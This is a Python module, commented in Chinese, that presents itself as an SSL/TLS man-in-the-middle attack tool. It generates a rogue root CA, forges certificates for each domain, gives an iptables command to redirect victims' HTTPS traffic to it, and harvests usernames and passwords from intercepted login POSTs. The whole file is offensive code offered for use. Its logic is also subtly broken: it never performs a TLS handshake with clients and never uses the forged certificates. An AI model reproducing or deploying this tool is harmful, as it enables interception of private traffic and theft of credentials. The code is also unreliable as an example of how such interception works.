#!/usr/bin/env python3
"""
SSL/TLS中間人攻擊模組
使用自簽名CA證書來攔截和解密HTTPS流量
"""

import socket
import ssl
import threading
import time
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from datetime import datetime, timedelta
import os
import json

class SSLMitm:
    def __init__(self, ca_cert_path="ca_cert.pem", ca_key_path="ca_key.pem", port=8443):
        """
        初始化SSL中間人攻擊器
        
        Args:
            ca_cert_path: CA證書路徑
            ca_key_path: CA私鑰路徑
            port: 監聽端口
        """
        self.ca_cert_path = ca_cert_path
        self.ca_key_path = ca_key_path
        self.port = port
        self.running = False
        self.server_socket = None
        self.captured_credentials = []
        self.cert_cache = {}  # 緩存生成的證書
        
        # 載入或創建CA證書
        self.ca_cert, self.ca_key = self._load_or_create_ca()
        
    def _load_or_create_ca(self):
        """載入現有的CA證書或創建新的"""
        if os.path.exists(self.ca_cert_path) and os.path.exists(self.ca_key_path):
            print(f"[*] 載入現有CA證書: {self.ca_cert_path}")
            try:
                with open(self.ca_cert_path, 'rb') as f:
                    ca_cert = x509.load_pem_x509_certificate(f.read())
                with open(self.ca_key_path, 'rb') as f:
                    ca_key = serialization.load_pem_private_key(f.read(), password=None)
                print("[+] CA證書載入成功")
                return ca_cert, ca_key
            except Exception as e:
                print(f"[!] 載入CA證書失敗: {e}")
                print("[*] 將創建新的CA證書")
        
        print("[*] 創建新的CA證書...")
        return self._create_ca()
    
    def _create_ca(self):
        """創建自簽名CA證書"""
        # 生成私鑰
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # 創建證書
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "TW"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Taiwan"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Taipei"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "MITM Proxy CA"),
            x509.NameAttribute(NameOID.COMMON_NAME, "MITM Proxy Root CA"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=3650)  # 10年有效期
        ).add_extension(
            x509.BasicConstraints(ca=True, path_length=None),
            critical=True,
        ).add_extension(
            x509.KeyUsage(
                key_encipherment=True,
                digital_signature=True,
                key_cert_sign=True,
                crl_sign=True,
            ),
            critical=True,
        ).sign(private_key, hashes.SHA256())
        
        # 保存證書和私鑰
        with open(self.ca_cert_path, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(self.ca_key_path, 'wb') as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        print(f"[+] CA證書已創建: {self.ca_cert_path}")
        print(f"[+] CA私鑰已創建: {self.ca_key_path}")
        print("[*] 請將CA證書安裝到目標系統的信任證書存儲中")
        
        return cert, private_key
    
    def _generate_certificate_for_domain(self, domain):
        """為指定域名生成證書"""
        if domain in self.cert_cache:
            return self.cert_cache[domain]
        
        print(f"[*] 為域名 {domain} 生成證書...")
        
        # 生成私鑰
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # 創建證書
        subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "TW"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Taiwan"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Taipei"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, domain),
            x509.NameAttribute(NameOID.COMMON_NAME, domain),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            self.ca_cert.subject
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName(domain),
                x509.DNSName(f"*.{domain}"),  # 支持子域名
            ]),
            critical=False,
        ).sign(self.ca_key, hashes.SHA256())
        
        # 緩存證書和私鑰
        self.cert_cache[domain] = (cert, private_key)
        
        return cert, private_key
    
    def _handle_client(self, client_socket, client_addr):
        """處理客戶端連接"""
        try:
            # 接收客戶端的SSL握手
            client_socket.settimeout(10)
            
            # 讀取客戶端請求
            request = client_socket.recv(4096).decode('utf-8', errors='ignore')
            
            if not request:
                return
            
            # 解析Host頭
            host = None
            for line in request.split('\n'):
                if line.startswith('Host:'):
                    host = line.split(':', 1)[1].strip()
                    break
            
            if not host:
                # 嘗試從SNI獲取
                # 這裡簡化處理，實際應該解析TLS握手
                host = "unknown"
            
            print(f"[*] 處理連接到: {host}")
            
            # 提取憑證
            if 'POST' in request and ('password' in request.lower() or 'login' in request.lower()):
                self._extract_credentials(request, client_addr)
            
            # 轉發請求到真實服務器
            try:
                # 連接到真實服務器
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.connect((host, 443))
                
                # 建立SSL連接
                context = ssl.create_default_context()
                ssl_server = context.wrap_socket(server_socket, server_hostname=host)
                
                # 轉發請求
                ssl_server.send(request.encode())
                response = ssl_server.recv(4096)
                
                # 轉發回應
                client_socket.send(response)
                
                ssl_server.close()
            except Exception as e:
                print(f"[!] 轉發請求錯誤: {e}")
            
        except Exception as e:
            print(f"[!] 處理客戶端錯誤: {e}")
        finally:
            client_socket.close()
    
    def _extract_credentials(self, data, client_addr):
        """從HTTP資料中提取憑證"""
        import urllib.parse
        import re
        
        try:
            # 提取POST body
            if '\r\n\r\n' in data:
                body = data.split('\r\n\r\n', 1)[1]
            else:
                body = data
            
            # 解析URL編碼資料
            try:
                parsed = urllib.parse.parse_qs(body)
                username = None
                password = None
                
                for key in ['user', 'username', 'email', 'login', 'userid', 'account']:
                    if key in parsed:
                        username = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                for key in ['password', 'passwd', 'pass', 'pwd']:
                    if key in parsed:
                        password = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                if username or password:
                    credential = {
                        'username': username or "N/A",
                        'password': password or "N/A",
                        'source_ip': client_addr[0],
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {credential['username']} / {credential['password']} (來源: {credential['source_ip']})")
            except:
                # 使用正則表達式
                username_match = re.search(r'(?:user|username|email|login)=([^&\s\r\n]+)', data, re.IGNORECASE)
                password_match = re.search(r'(?:password|passwd|pass|pwd)=([^&\s\r\n]+)', data, re.IGNORECASE)
                
                if username_match or password_match:
                    username = urllib.parse.unquote(username_match.group(1)) if username_match else "N/A"
                    password = urllib.parse.unquote(password_match.group(1)) if password_match else "N/A"
                    
                    credential = {
                        'username': username,
                        'password': password,
                        'source_ip': client_addr[0],
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {username} / {password} (來源: {credential['source_ip']})")
        except Exception as e:
            pass
    
    def start(self):
        """啟動SSL中間人代理"""
        if self.running:
            return False
        
        try:
            # 創建服務器套接字
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"[+] SSL中間人代理已啟動 (端口: {self.port})")
            print(f"[*] CA證書位置: {self.ca_cert_path}")
            print(f"[*] 請配置iptables將HTTPS流量重定向到此端口")
            print(f"[*] 命令: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {self.port}")
            
            while self.running:
                try:
                    client_socket, client_addr = self.server_socket.accept()
                    # 在新線程中處理客戶端
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, client_addr),
                        daemon=True
                    )
                    client_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"[!] 接受連接錯誤: {e}")
        except Exception as e:
            print(f"[!] 啟動SSL中間人代理錯誤: {e}")
            self.running = False
            return False
        
        return True
    
    def stop(self):
        """停止SSL中間人代理"""
        if not self.running:
            return False
        
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        print("[+] SSL中間人代理已停止")
        return True
    
    def get_captured_credentials(self):
        """獲取捕獲的憑證"""
        return self.captured_credentials
    
    def get_ca_cert_path(self):
        """獲取CA證書路徑"""
        return self.ca_cert_path

